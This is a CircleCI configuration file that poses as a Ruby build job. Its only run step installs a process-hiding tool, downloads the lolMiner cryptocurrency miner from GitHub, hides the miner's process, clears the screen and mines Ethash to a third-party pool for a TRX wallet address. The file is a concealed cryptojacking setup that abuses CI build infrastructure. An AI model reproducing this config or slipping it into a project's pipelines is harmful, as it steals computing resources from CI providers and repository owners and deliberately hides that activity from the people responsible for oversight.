version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
        auth:
          username: mydockerhub-user
          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
    steps:
      - checkout
      - run: sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add lolMiner && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jipiyu --ethstratum ETHPROXY

